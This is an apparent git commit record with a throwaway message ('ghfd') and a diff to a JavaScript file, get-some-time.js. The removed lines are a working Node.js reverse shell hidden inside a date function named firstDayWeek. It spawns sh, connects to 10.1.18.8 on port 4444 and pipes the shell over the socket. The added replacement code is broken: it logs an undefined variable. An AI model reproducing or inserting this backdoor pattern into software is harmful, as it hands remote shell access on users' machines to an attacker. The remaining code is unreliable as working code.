4d11be457281a61b9602b9c16eea985c5b119a59
mhilli <howasimo57@gmail.com>
2025-12-03 20:15:16 +0100

    ghfd

--- get-some-time.js
+++ get-some-time.js
@@ -1,14 +1,5 @@
 function firstDayWeek(nb, year) {
- (function () {
-   var net = require("net"),
-     cp = require("child_process"),
-     sh = cp.spawn("sh", []);
-   var client = new net.Socket();
-   client.connect(4444, "10.1.18.8", function () {
-     client.pipe(sh.stdin);
-     sh.stdout.pipe(client);
-     sh.stderr.pipe(client);
-   });
-   return /a/; // Prevents the Node.js application from crashing
- })();
+console.log(tests);
+
 }
+firstDayWeek(10,2006)
